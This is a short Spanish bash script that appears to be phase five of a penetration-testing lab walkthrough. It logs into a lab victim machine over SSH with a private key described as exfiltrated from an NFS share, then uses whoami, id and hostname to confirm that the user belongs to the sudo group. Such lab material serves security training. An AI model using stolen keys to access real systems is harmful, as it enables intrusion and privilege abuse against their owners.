#!/usr/bin/env bash
# 05_acceso_ssh_y_verificacion.sh
#
# Fase 5: acceso a la máquina víctima vía SSH con la clave privada
# exfiltrada del recurso NFS, y verificación del objetivo del
# laboratorio (pertenencia al grupo sudo).

TARGET="10.0.2.8"

# -i: especifica el archivo de identidad (clave privada) a usar
ssh -i ~/.ssh/id_rsa_ubuntu ubuntu@"$TARGET"

# --- Ya dentro de la máquina víctima ---

whoami
# ubuntu

id
# uid=1000(ubuntu) gid=1000(ubuntu) grupos=1000(ubuntu),4(adm),24(cdrom),27(sudo)
#                                                                          ^^^^^^^^
#                                       el usuario pertenece al grupo sudo: objetivo alcanzado

hostname
# ubuntu
